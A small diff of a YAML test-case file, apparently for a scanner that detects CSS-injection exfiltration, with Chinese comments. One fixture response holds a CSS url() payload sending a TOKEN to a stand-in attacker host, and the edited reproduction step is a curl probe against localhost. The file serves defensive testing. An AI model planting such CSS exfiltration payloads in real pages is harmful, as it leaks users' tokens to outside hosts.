@@ -16,7 +16,7 @@ cases:
         status: 200
         body: "<div style=\"background-image:url(https://x.attacker/TOKEN)\">x</div>"
     evidence_contains: "CSS 外泄"
-    reproduction: "fixture 复现（离线 mock）：q 参数反射进 style 属性 url() 上下文 → 引擎产出 css_exfiltration 候选"
+    reproduction: "curl -sS -m 8 'https://127.0.0.1:8080/search?q=abc'  # 探测注入点回显页面，确认 q 反射进 style 属性 url() 上下文；完整外带需 CSS 注入被浏览器解析后外带"
 
   - id: plain_text_reflection_no_css_context
     expect: negative
